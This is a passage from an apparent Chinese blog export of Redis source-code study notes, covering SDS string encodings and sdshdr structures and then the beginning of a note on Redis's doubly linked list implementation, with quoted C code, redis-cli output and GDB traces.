class="line">        <span class="built_in">memcpy</span>(sh-&gt;buf,ptr,len);</span><br><span class="line">        sh-&gt;buf[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memset</span>(sh-&gt;buf,<span class="number">0</span>,len+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="设计embstr编码的用意是什么"><a href="#设计embstr编码的用意是什么" class="headerlink" title="设计embstr编码的用意是什么"></a>设计embstr编码的用意是什么<span id="jump14"></span></h4><p>相比于raw编码，embstr编码存储短字符串的优点：</p>
<ul>
<li><p>创建字符串对象时，malloc次数从2次变为1次，释放字符串对象时，free次数从2次变成1次。</p>
</li>
<li><p>embstr编码中，<code>redisObject</code>和<code>sdshdr</code>内存连续，可以更好利用缓存，提升效率。</p>
</li>
</ul>
<h4 id="三种编码之间的转换规则"><a href="#三种编码之间的转换规则" class="headerlink" title="三种编码之间的转换规则"></a>三种编码之间的转换规则<span id="jump15"></span></h4><p><strong>规则1：</strong> embstr对象执行修改命令后，总是会变成一个raw编码对象。</p>
<p><strong>规则2：</strong> 对于int对象，如果在这个对象执行的操作导致其保存的值不在long范围内，这个对象编码总是变成raw</p>
<p><strong>源码分析：</strong></p>
<p>以APPEND命令为例，源码参考<code>appendCommand</code>，此函数最终调用<code>dbUnshareStringValue</code>，总是创建一个raw编码的对象。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">appendCommand</span><span class="params">(redisClient *c)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> totlen;</span><br><span class="line">    robj *o, *append;</span><br><span class="line">    o = lookupKeyWrite(c-&gt;db,c-&gt;argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 键值对不存在就创建一个新的 ......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 键值对存在 ......</span></span><br><span class="line">        <span class="comment">/* &quot;append&quot; is an argument, so always an sds */</span></span><br><span class="line">        append = c-&gt;argv[<span class="number">2</span>];</span><br><span class="line">        totlen = stringObjectLen(o)+sdslen(append-&gt;ptr);</span><br><span class="line">        <span class="keyword">if</span> (checkStringLength(c,totlen) != REDIS_OK)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">/* Append the value */</span></span><br><span class="line">        o = dbUnshareStringValue(c-&gt;db,c-&gt;argv[<span class="number">1</span>],o);</span><br><span class="line">        o-&gt;ptr = sdscatlen(o-&gt;ptr,append-&gt;ptr,sdslen(append-&gt;ptr));</span><br><span class="line">        totlen = sdslen(o-&gt;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">dbUnshareStringValue</span><span class="params">(redisDb *db, robj *key, robj *o)</span> &#123;</span><br><span class="line">    redisAssert(o-&gt;type == REDIS_STRING);</span><br><span class="line">    <span class="keyword">if</span> (o-&gt;refcount != <span class="number">1</span> || o-&gt;encoding != REDIS_ENCODING_RAW) &#123;</span><br><span class="line">        robj *decoded = getDecodedObject(o);</span><br><span class="line">        o = createRawStringObject(decoded-&gt;ptr, sdslen(decoded-&gt;ptr)); <span class="comment">// embstr对象执行修改命令后，总是会变成一个raw编码对象。</span></span><br><span class="line">        decrRefCount(decoded);</span><br><span class="line">        dbOverwrite(db,key,o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key &quot;hello&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;embstr&quot;</span><br><span class="line">127.0.0.1:6379&gt; append key &quot; world!&quot;</span><br><span class="line">(integer) 12</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;raw&quot;</span><br></pre></td></tr></table></figure>



<h4 id="REDIS3-2中的SDS实现"><a href="#REDIS3-2中的SDS实现" class="headerlink" title="REDIS3.2中的SDS实现"></a>REDIS3.2中的SDS实现<span id="jump16"></span></h4><p>REDIS 3.2中，根据SDS的长度又细分为5类，对于不同长度的字符串，用不同的sdshdrX结构体存储，实现节约内存的目的。</p>
<p>以REDIS 6.0.10源码为例，sdshdr结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *sds;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Note: sdshdr5 is never used, we just access the flags byte directly.</span></span><br><span class="line"><span class="comment"> * However is here to document the layout of type 5 SDS strings. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr5</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, and 5 msb of string length */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr8</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint8_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr16</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint16_t</span> alloc; <span class="comment">/* excluding the he</span></span><br><span class="line"><span class="comment">    ader and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr32</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint32_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr64</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="type">uint64_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="type">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>各结构体成员作用：</strong></p>
<ul>
<li><p>len表示字符串实际长度。</p>
</li>
<li><p>alloc表示为sds分配的大小，不包括’\0’。</p>
</li>
<li><p>flags表示sdshdr类型，用于判断sds的类型。flags本身是char类型有8位，其中高5位保留，只用低3位足以这表示5种sdshdr类型，参考源码：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_5  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_8  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_16 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_32 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_64 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_MASK 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_TYPE_BITS 3</span></span><br></pre></td></tr></table></figure>

<p><strong><code>__attribute__ ((__packed__))</code>作用？</strong></p>
<p><code>__attribute__ ((__packed__))</code>是GCC特有的语法，作用是取消结构体的字节对齐，采用内存紧凑模式排列。</p>
<p>这里给出加上或不加关键字时，各sdshdr结构体的大小：</p>
<table>
<thead>
<tr>
<th align="left">结构体</th>
<th align="left">加GCC关键字<code>__attribute__ ((__packed__))</code></th>
<th align="left">不加关键字</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sdshdr5</td>
<td align="left">1字节</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">sdshdr8</td>
<td align="left">3</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">sdshdr16</td>
<td align="left">5</td>
<td align="left">6</td>
</tr>
<tr>
<td align="left">sdshdr32</td>
<td align="left">9</td>
<td align="left">12</td>
</tr>
<tr>
<td align="left">sdshdr64</td>
<td align="left">17</td>
<td align="left">24</td>
</tr>
</tbody></table>
<p><strong>问题思考</strong>：取消结构体字节对齐的用意是什么，有什么优点？</p>
<ul>
<li>1个好处是节约了内存，时间换空间。</li>
<li>另1个好处是使得<strong>通过内存直接访问结构体内部变量非常方便</strong>，比如通过buf[-1]这种骚操作可以直接访问到<code>flags</code>成员，从而判断sds类型，实现非常简洁。源码参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds s;</span><br><span class="line"><span class="type">char</span> type = s[<span class="number">-1</span>] &amp; SDS_TYPE_MASK;</span><br></pre></td></tr></table></figure>

<h4 id="给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？"><a href="#给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？" class="headerlink" title="给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？"></a>给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？<span id="jump17"></span></h4><p>以REDIS 6.0.10源码为例，参考<code>sdsReqType</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> <span class="title function_">sdsReqType</span><span class="params">(<span class="type">size_t</span> string_size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_5;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xffff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_16;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">0xffffffff</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得出如下结论：</p>
<ul>
<li>SDS长度小于32，用sdshdr5类型表示</li>
<li>SDS长度在 [32, 255），用sdshdr8类型表示</li>
<li>依次类推 ……</li>
</ul>
<p><strong>思考问题：</strong><code>set key hello</code>， 键key和值hello都是用sdshdr5表示的吗？</p>
<p>详细分析过程参考文章：<a href="https://segmentfault.com/a/1190000017450295">https://segmentfault.com/a/1190000017450295</a></p>
<p>以下仅给出结论和验证结果：</p>
<p><strong>结论：</strong></p>
<ul>
<li><p><strong>对于长度小于32的字符串键和值，键通过sdshdr5表示，而值通过sdshdr8表示</strong></p>
</li>
<li><p>对于值，使用<code>createEmbeddedStringObject</code>总是创建一个sdshdr8类型的对象。</p>
</li>
<li><p>对于键，通过调用链<code>setGenericCommand--&gt;genericSetKey--&gt;dbAdd</code>，最终调用<code>sdsdup</code>，创建一个sdshdr5类型的对象。调用栈参考：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  dbAdd (db=0x557b1c4d9690, key=0x557b1c4f5720, val=0x557b1c4f4730) at db.c:185</span><br><span class="line">#1  0x0000557b1b95751d in genericSetKey (c=c@entry=0x557b1c4ecfa0, db=0x557b1c4d9690, key=key@entry=0x557b1c4f5720,</span><br><span class="line">    val=val@entry=0x557b1c4f4730, keepttl=keepttl@entry=0, signal=signal@entry=1) at db.c:252</span><br><span class="line">#2  0x0000557b1b9649e7 in setGenericCommand (c=c@entry=0x557b1c4ecfa0, flags=flags@entry=0, key=0x557b1c4f5720,</span><br><span class="line">    val=0x557b1c4f4730, expire=expire@entry=0x0, unit=unit@entry=0, ok_reply=0x0, abort_reply=0x0) at t_string.c:87</span><br><span class="line">#3  0x0000557b1b964c51 in setCommand (c=0x557b1c4ecfa0) at t_string.c:146</span><br><span class="line">#4  0x0000557b1b93bd5e in call (c=0x557b1c4ecfa0, flags=15) at server.c:3368</span><br><span class="line">#5  0x0000557b1b93c7a5 in processCommand (c=c@entry=0x557b1c4ecfa0) at server.c:3797</span><br><span class="line">#6  0x0000557b1b94a7b0 in processCommandAndResetClient (c=c@entry=0x557b1c4ecfa0) at networking.c:1895</span><br><span class="line">#7  0x0000557b1b94f09a in processInputBuffer (c=0x557b1c4ecfa0) at networking.c:1978</span><br><span class="line">#8  0x0000557b1b9cbd48 in callHandler (handler=&lt;optimized out&gt;, conn=0x557b1c4fdd60) at connhelpers.h:79</span><br><span class="line">#9  connSocketEventHandler (el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=0x557b1c4fdd60, mask=&lt;optimized out&gt;)</span><br><span class="line">    at connection.c:296</span><br><span class="line">#10 0x0000557b1b9356c7 in aeProcessEvents (eventLoop=eventLoop@entry=0x557b1c479aa0, flags=flags@entry=27) at ae.c:479</span><br><span class="line">#11 0x0000557b1b935a0d in aeMain (eventLoop=0x557b1c479aa0) at ae.c:539</span><br><span class="line">#12 0x0000557b1b932216 in main (argc=2, argv=0x7ffe8e366c18) at server.c:5498</span><br></pre></td></tr></table></figure>

<p><strong>GDB验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/tb ((*(robj *)server.db[0].dict.ht[0].table[1].v).ptr - 1) // value</span><br><span class="line">0x557b1c4f4742: 00000001	// 注意value的最后三位为001，表示SDS_TYPE_8</span><br><span class="line">$2 = &#123;len = 5 &#x27;\005&#x27;, alloc = 5 &#x27;\005&#x27;, flags = 1 &#x27;\001&#x27;, buf = 0x557b1c4f4743 &quot;hello&quot;&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p (sds)server.db[0].dict.ht[0].table[1].key</span><br><span class="line">$3 = (sds) 0x557b1c502f61 &quot;key&quot;</span><br><span class="line">(gdb) x/tb 0x557b1c502f61 - 0x1</span><br><span class="line">0x557b1c502f60: 00011000	// 注意key的最后三位为000，表示SDS_TYPE_5</span><br></pre></td></tr></table></figure>

<p><strong>思考问题</strong>：对于短字符串，为什么键底层类型为sdshdr5，值底层类型设置却成sdshdr8？</p>
<p>个人分析：实际应用场景中，通常键的更新次数远小于值的更新次数。所以对键采用最小的内存存储，以节省空间；对值用更大的内存存储，减少内存重分配的次数，提高性能。</p>
<h4 id="REDIS字符串命令"><a href="#REDIS字符串命令" class="headerlink" title="REDIS字符串命令"></a>REDIS字符串命令<span id="jump18"></span></h4><p>REDIS 字符串命令参考官方网站：<a href="https://redis.io/commands#string">https://redis.io/commands#string</a></p>
<p>以下仅给出几个最常用的命令:</p>
<ul>
<li>set key value</li>
<li>get key</li>
<li>append key value</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》第2章 简单动态字符串，第8章 对象</p>
<p>【2】<a href="https://blog.huangz.me/diary/2014/how-to-read-redis-source-code.html">如何阅读Redis源码</a></p>
<p>【3】<a href="https://segmentfault.com/a/1190000017450295">【Redis源码分析】一个对SDSHDR5是否使用的疑问</a></p>
<p>【4】<a href="https://www.cnblogs.com/davygeek/p/5748852.html">柔性数组</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(二)——链表</title>
    <url>/2021/12/12/2021-12-12-redis-note-02-linkedlist/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>链表在Redis中的应用非常广泛，链表是列表键的底层实现之一，发布订阅，慢查询，监视器等功能也用到了链表。</p>
<p>以下给出Redis中链表相关的一些思考问题，通过源码分析，给出问题的答案，掌握链表的底层实现原理和设计思路。</p>
<p>源码版本：<a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<span id="more"></span>

<h2 id="问题思考"><a href="#问题思考" class="headerlink" title="问题思考"></a>问题思考</h2><p>C语言中如何设计一个通用的泛型链表？</p>
<ul>
<li><p><a href="#jump1">Redis中的链表和链表节点的实现</a></p>
<ul>
<li><a href="#jump2">节点值的类型是void *，这样设计有什么好处？</a></li>
<li><a href="#jump3">仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表？</a></li>
<li><a href="#jump4">为什么用双向链表，不用单链表？</a></li>
</ul>
</li>
<li><p><a href="#jump5">双向链表API实现分析</a></p>
<ul>
<li><a href="#jump6">链表创建</a></li>
<li><a href="#jump7">链表销毁</a></li>
<li><a href="#jump8">头部插入节点</a></li>
<li><a href="#jump9">尾部插入节点</a></li>
<li><a href="#jump10">指定位置前后插入节点</a></li>
<li><a href="#jump11">删除指定节点</a></li>
<li><a href="#jump12">链表迭代器的设计实现</a></li>
<li><a href="#jump13">查找指定节点</a></li>
<li><a href="#jump14">复制链表</a></li>
<li><a href="#jump15">表头节点移动到表尾</a></li>
</ul>
</li>
</ul>
<h3 id="链表和链表节点的实现"><a href="#链表和链表节点的实现" class="headerlink" title="链表和链表节点的实现"></a>链表和链表节点的实现<span id="jump1"></span></h3><p>以REDIS 6.0.10源码为例，链表的实现参考<code>adlist.h</code>, <code>adlist.c</code></p>
<p>链表节点通过listNode结构体实现，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> *value;</span><br><span class="line">&#125; listNode;</span><br></pre></td></tr></table></figure>

<p>可以看出这是一个双向链表，value存储节点值，其类型为void *</p>
<h4 id="节点值的类型为void-，这样设计有什么好处？"><a href="#节点值的类型为void-，这样设计有什么好处？" class="headerlink" title="节点值的类型为void *，这样设计有什么好处？"></a>节点值的类型为void *，这样设计有什么好处？<span id="jump2"></span></h4><p>节点值设置void *类型，目的是实现一个通用的泛型链表，提高代码复用性。（类似C++的STL容器，多态思想）</p>
<p>考虑实际应用场景中，链表节点值的类型可以是int, float, double等基本类型, 或者是自定义结构体类型，如果简单将value定义为某个具体类型，就只能为每个节点类型定义一个listNodeXX的结构体，同时需额外为每个节点类型新增一套增、删、改、查的API，实现非常繁琐，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNodeInt</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">&#125; listNodeInt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listNodeDouble</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">double</span> value;</span><br><span class="line">&#125; listNodeDouble;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加一个节点到链表头部</span></span><br><span class="line"><span class="built_in">list</span> *<span class="title function_">listAddNodeHeadInt</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">int</span> value)</span>;</span><br><span class="line"><span class="built_in">list</span> *<span class="title function_">listAddNodeHeadDouble</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>, <span class="type">double</span> value)</span>;</span><br></pre></td></tr></table></figure>

<p>可以看出，这种实现方式的问题在于<strong>代码重复度过高，难以维护，且扩展性差，每支持一个新的节点类型都要新增代码</strong>，这显然是不能接受的。所以节点值类型要设计为void *</p>
<h4 id="仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表-这样设计有什么好处？"><a href="#仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表-这样设计有什么好处？" class="headerlink" title="仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表, 这样设计有什么好处？"></a>仅使用多个listNode也能组成链表，为什么还要额外用一个list结构去持有链表, 这样设计有什么好处？<span id="jump3"></span></h4><p>Redis中额外使用list结构，用于持有链表，简化操作。list结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span></span><br><span class="line">    listNode *head;</span><br><span class="line">    listNode *tail;</span><br><span class="line">    <span class="type">void</span> *(*dup)(<span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">int</span> (*match)(<span class="type">void</span> *ptr, <span class="type">void</span> *key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;</span><br><span class="line">&#125; <span class="built_in">list</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>head, tail用于记录表头指针和表尾指针，好处是获取表头节点或表尾节点的时间复杂度为O(1)</p>
</li>
<li><p>len类型用于记录链表长度， 好处是获取链表节点总数的时间复杂度为O(1)</p>
</li>
<li><p>dup, free, match成员用于实现多态链表，对于不同类型的节点，挂接不同的函数钩子，设置特定的复制、释放、比较操作。</p>
<ul>
<li>dup函数用于复制节点值</li>
<li>free函数用于释放节点值</li>
<li>match函数用于比较两个节点值是否相等</li>
</ul>
</li>
</ul>
<p><strong>举例</strong>：一个长度为2的双向链表示意图：<br><img src="/2021/12/12/2021-12-12-redis-note-02-linkedlist/image1.png"></p>
<h3 id="为什么用双向链表，不用单链表？"><a href="#为什么用双向链表，不用单链表？" class="headerlink" title="为什么用双向链表，不用单链表？"></a>为什么用双向链表，不用单链表？<span id="jump4"></span></h3><p>双向链表相较于单链表，有如下优点：</p>
<ul>
<li>支持双向查找节点，且查找给定节点的前驱节点的时间复杂度为O(1)</li>
<li>尾部插入节点快，时间复杂度为O(1)</li>
</ul>
<h3 id="双向链表API实现分析"><a href="#双向链表API实现分析" class="headerlink" title="双向链表API实现分析"></a>双向链表API实现分析<span id="jump5"></span></h3><h4 id="链表创建"><a href="#链表创建" class="headerlink" title="链表创建"></a>链表创建<span id="jump6"></span></h4><p>调用<code>listCreate</code>，创建一个空的双向链表，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> *<span class="title function_">listCreate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list</span> *<span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">list</span> = zmalloc(<span class="keyword">sizeof</span>(*<span class="built_in">list</span>))) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = <span class="built_in">list</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;dup = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;<span class="built_in">free</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;match = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="链表销毁"><a href="#链表销毁" class="headerlink" title="链表销毁"></a>链表销毁<span id="jump7"></span></h4><p>调用<code>listRelease</code>，释放链表，时间复杂度O(N)，N为链表长度</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">listRelease</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    listEmpty(<span class="built_in">list</span>);</span><br><span class="line">    zfree(<span class="built_in">list</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">listEmpty</span><span class="params">(<span class="built_in">list</span> *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;</span><br><span class="line">    listNode *current, *next;</span><br><span class="line"></span><br><span class="line">    current = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    len = <span class="built_in">list</span>-&gt;len;</span><br><span class="line">    <span class="keyword">while</span>(len--) &#123;</span><br><span class="line">        next = current-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span>-&gt;<span class="built_in">free</span>) <span class="built_in">list</span>-&gt;<span class="built_in">free</span>(current-&gt;value);	<span class="comment">// 不同的节点类型，挂接不同的free函数钩子，实现多态链表的释放操作。</span></span><br><span class="line">        zfree(current);</span><br><span class="line">        current = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">list</span>-&gt;head = <span class="built_in">list</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="头部插入节点"><a href="#头部插入节点" class="headerlink" title="头部插入节点"></a>头部插入节点<span id="jump8"></span></h4><p>调用<code>listAddNodeHead</code>，在链表头部插入节点，时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listAddNodeHead(list *list, void *value) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (list-&gt;len == 0) &#123;</span><br><span class="line">        list-&gt;head = list-&gt;tail = node;</span><br><span class="line">        node-&gt;prev = node-&gt;next = NULL;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;prev = NULL;</span><br><span class="line">        node-&gt;next = list-&gt;head;</span><br><span class="line">        list-&gt;head-&gt;prev = node;</span><br><span class="line">        list-&gt;head = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="尾部插入节点"><a href="#尾部插入节点" class="headerlink" title="尾部插入节点"></a>尾部插入节点<span id="jump9"></span></h4><p>调用<code>listAddNodeTail</code>, 在链表尾部插入节点，时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list *listAddNodeTail(list *list, void *value) &#123;</span><br><span class="line">    listNode *node;</span><br><span class="line"></span><br><span class="line">    if ((node = zmalloc(sizeof(*node))) == NULL)</span><br><span class="line">        return NULL;</span><br><span class="line">    node-&gt;value = value;</span><br><span class="line">    if (list-&gt;len == 0) &#123;</span><br><span class="line">        list-&gt;head = list-&gt;tail = node;</span><br><span class="line">        node-&gt;prev = node-&gt;next = NULL;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        node-&gt;prev = list-&gt;tail;</span><br><span class="line">        node-&gt;next = NULL;</span><br><span class="line">        list-&gt;tail-&gt;next = node;</span><br><span class="line">        list-&gt;tail = node;</span><br><span class="line">    &#125;</span><br><span class="line">    list-&gt;len++;</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="指定位置前后插入节点"><a href="#指定位置前后插入节点" class="headerlink" title="指定位置前后插入节点"></a>指定位置前后插入节点<span id="jump10"></span></h4><p>调用<code>listInsertNode</code>，在指定位置之前或之后插入节点，时间复杂度O(1)</p>
